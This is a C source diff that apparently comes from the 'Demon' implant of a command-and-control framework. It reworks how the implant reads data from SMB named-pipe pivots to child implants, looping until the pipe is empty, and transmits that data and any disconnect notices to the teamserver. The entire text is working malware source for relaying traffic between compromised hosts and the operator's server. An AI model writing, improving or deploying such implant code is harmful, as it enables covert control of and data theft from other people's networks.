@@ -116,7 +116,7 @@ BOOL PivotRemove( DWORD DemonId )
 
 VOID PivotCollectOutput()
 {
-    PPACKAGE    Package   = PackageCreate( DEMON_COMMAND_PIVOT );
+    PPACKAGE    Package   = NULL;
     PPIVOT_DATA TempList  = Instance->SmbPivots;
     DWORD       BytesSize = 0;
     DWORD       Length    = 0;
@@ -130,56 +130,71 @@ VOID PivotCollectOutput()
 
         if ( TempList->Handle )
         {
-            if ( Instance->Win32.PeekNamedPipe( TempList->Handle, NULL, 0, NULL, &BytesSize, NULL ) )
-            {
-                if ( BytesSize >= sizeof( UINT32 ) )
+            do {
+
+                if ( Instance->Win32.PeekNamedPipe( TempList->Handle, NULL, 0, NULL, &BytesSize, NULL ) )
                 {
-                    if ( Instance->Win32.PeekNamedPipe( TempList->Handle, &Length, sizeof( UINT32 ), NULL, &BytesSize, NULL ) )
+                    if ( BytesSize >= sizeof( UINT32 ) )
                     {
-                        Length = __builtin_bswap32( Length ) + sizeof( UINT32 );
-                        // PRINTF( "Peeked Package Length => %x\n", Length );
-
-                        Output = Instance->Win32.LocalAlloc( LPTR, Length );
-                        if ( Instance->Win32.ReadFile( TempList->Handle, Output, Length, &BytesSize, NULL ) )
+                        if ( Instance->Win32.PeekNamedPipe( TempList->Handle, &Length, sizeof( UINT32 ), NULL, &BytesSize, NULL ) )
                         {
-                            // PRINTF( "[DEMON_PIVOT_SMB_COMMAND] Read Command => %d\n", BytesSize );
-                            PackageAddInt32( Package, DEMON_PIVOT_SMB_COMMAND );
-                            PackageAddBytes( Package, Output, BytesSize );
-                            PackageTransmit( Package, NULL, NULL );
-                        }
-                        else
-                        {
-                            PRINTF( "ReadFile: Failed[%d]\n", NtGetLastError() );
-                        }
+                            Length = __builtin_bswap32( Length ) + sizeof( UINT32 );
+                            Output = Instance->Win32.LocalAlloc( LPTR, Length );
 
-                        MemSet( Output, 0, Length );
-                        Instance->Win32.LocalFree( Output );
-                        Output = NULL;
+                            if ( Instance->Win32.ReadFile( TempList->Handle, Output, Length, &BytesSize, NULL ) )
+                            {
+                                PRINTF( "Output Length:[%d] BytesSize:[%d]\n", Length, BytesSize )
+                                PRINT_HEX( Output, BytesSize )
+
+                                Package = PackageCreate( DEMON_COMMAND_PIVOT );
+                                PackageAddInt32( Package, DEMON_PIVOT_SMB_COMMAND );
+                                PackageAddBytes( Package, Output, BytesSize );
+
+                                PUTS( "Send data to the teamserver." )
+                                PackageTransmit( Package, NULL, NULL );
+                            }
+                            else
+                            {
+                                PRINTF( "ReadFile: Failed[%d]\n", NtGetLastError() );
+                            }
+
+                            MemSet( Output, 0, Length );
+                            Instance->Win32.LocalFree( Output );
+                            Output = NULL;
+                        }
+                    } else {
+                        PUTS( "No more data to read." )
+                        break;
                     }
                 }
-            }
-            else
-            {
-                PRINTF( "PeekNamedPipe: Failed[%d]\n", NtGetLastError() );
-
-                if ( NtGetLastError() == ERROR_BROKEN_PIPE )
+                else
                 {
-                    PUTS( "ERROR_BROKEN_PIPE :: Pivot disconnected" )
-                    TempList->Handle = NULL;
+                    PRINTF( "PeekNamedPipe: Failed[%d]\n", NtGetLastError() );
 
-                    PivotRemove( TempList->DemonID );
+                    if ( NtGetLastError() == ERROR_BROKEN_PIPE )
+                    {
+                        PUTS( "ERROR_BROKEN_PIPE :: Pivot disconnected" )
+                        TempList->Handle = NULL;
 
-                    PackageAddInt32( Package, DEMON_PIVOT_SMB_DISCONNECT );
-                    PackageAddInt32( Package, TempList->DemonID );
+                        // Sends already read data.
+                        PackageTransmit( Package, NULL, NULL );
 
-                    PackageTransmit( Package, NULL, NULL );
+                        Package = PackageCreate( DEMON_COMMAND_PIVOT );
+                        PackageAddInt32( Package, DEMON_PIVOT_SMB_DISCONNECT );
+                        PackageAddInt32( Package, TempList->DemonID );
+                        PackageTransmit( Package, NULL, NULL );
 
-                    return;
+                        PivotRemove( TempList->DemonID );
+
+                        return;
+                    }
+
+                    SEND_WIN32_BACK
+                    PackageDestroy( Package );
+                    break;
                 }
 
-                SEND_WIN32_BACK
-                PackageDestroy( Package );
-            }
+            } while ( TRUE );
         }
 
         // select the next pivot
